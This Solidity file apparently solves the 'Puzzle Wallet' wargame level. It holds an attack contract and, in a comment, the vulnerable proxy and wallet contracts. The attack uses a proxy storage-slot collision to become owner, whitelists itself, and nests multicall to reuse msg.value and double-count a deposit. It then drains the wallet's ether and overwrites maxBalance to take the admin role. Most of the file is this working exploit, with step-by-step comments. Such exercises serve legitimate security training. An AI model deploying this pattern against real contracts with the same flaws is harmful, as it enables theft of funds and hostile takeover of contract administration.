// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
pragma experimental ABIEncoderV2;

// Defining functions called for both proxy and implementation
interface IWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleWalletHack {
    constructor(IWallet puzzleWallet) payable {

        // Updates `pendingAdmin`, which updates `owner` to be our PuzzleWalletHack contract.
        puzzleWallet.proposeNewAdmin(address(this));
        // Now that we are `owner` of `PuzzleWallet`, we whitelist ourself.
        puzzleWallet.addToWhitelist(address(this));


        /********************************
        Prepare the data to call `deposit` 
        ********************************/
        // Initialize a dynamic bytes array with 1 element.
        bytes[] memory deposit_data = new bytes[](1);
        // Set that element in deposit_data to the encoded function selector for `puzzleWallet.deposit`.
        deposit_data[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);


        /********************************
        Prepare the data to call `multicall` 
        *********************************/
        // Initialize a dynamic bytes array with a 2 elements.
        bytes[] memory multicall_data = new bytes[](2);
        // Set the 1st element to the same as deposit_data's element.
        multicall_data[0] = deposit_data[0];
        // Set the 2nd element to the encoded function selector for `puzzleWallet.multicall` with deposit_data.
        multicall_data[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, deposit_data);
        // Call `multicall` with 0.001 ETH and the entire multicall_data.
        puzzleWallet.multicall{value: 0.001 ether}(multicall_data);

        // `PuzzleWallet` now has 0.002 ETH, which we can withdraw via `execute`.
        puzzleWallet.execute(msg.sender, 0.002 ether, "");

        // We are whitelisted and `PuzzleWallet` balance is now 0.
        // Calling `setMaxBalance` updates `maxBalance` which updates `admin` to `msg.sender`.
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(puzzleWallet.admin() == msg.sender, "hack failed");
    }
}


/*
// Target Contracts
import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
*/